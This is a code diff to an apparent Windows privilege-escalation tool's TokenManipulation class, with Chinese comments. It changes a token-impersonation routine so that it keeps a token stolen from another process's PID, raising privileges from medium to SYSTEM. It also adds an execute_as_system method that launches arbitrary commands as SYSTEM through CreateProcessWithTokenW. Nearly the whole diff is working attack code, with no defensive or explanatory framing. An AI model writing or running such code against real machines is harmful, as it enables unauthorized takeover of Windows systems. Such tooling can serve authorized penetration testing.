@@ -262,7 +262,7 @@ class TokenManipulation:
                         )
 
                     try:
-                        # 模拟用户
+                        # 模拟用户 (仅影响当前线程)
                         if not advapi32.ImpersonateLoggedOnUser(h_new_token):
                             return EscalationResult(
                                 success=False,
@@ -272,13 +272,17 @@ class TokenManipulation:
                                 error="Failed to impersonate user",
                             )
 
+                        # 保存 token handle 用于后续 CreateProcessWithToken
+                        self._impersonated_token = int(h_new_token)
+
                         return EscalationResult(
                             success=True,
                             method=EscalationMethod.TOKEN_IMPERSONATION,
                             from_level=PrivilegeLevel.MEDIUM,
                             to_level=PrivilegeLevel.SYSTEM,
-                            output=f"Successfully impersonated token from PID {target_pid}",
-                            evidence=f"Target PID: {target_pid}",
+                            output=f"Impersonated token from PID {target_pid}. "
+                            f"Use execute_as_system(cmd) to run commands with this token.",
+                            evidence=f"Target PID: {target_pid}, Token: {int(h_new_token)}",
                         )
 
                     finally:
@@ -307,6 +311,24 @@ class TokenManipulation:
                 to_level=PrivilegeLevel.MEDIUM,
                 error=str(e),
             )
+
+    def execute_as_system(self, command: str) -> dict:
+        """使用窃取的 SYSTEM token 执行命令 (解决线程级 impersonate 的局限)
+
+        必须先调用 impersonate_system() 获取 token。
+        使用 CreateProcessWithTokenW 创建新进程, 确保子进程也以 SYSTEM 权限运行。
+
+        Args:
+            command: 要执行的命令
+
+        Returns:
+            {"success": bool, "output": str, "error": str}
+        """
+        if not hasattr(self, "_impersonated_token") or not self._impersonated_token:
+            return {"success": False, "error": "未持有 impersonated token, 请先调用 impersonate_system()"}
+
+        result = self.create_process_with_token(self._impersonated_token, command)
+        return {"success": result, "command": command, "token": self._impersonated_token}
 
     def create_process_with_token(self, token_handle: int, command: str) -> bool:
         """
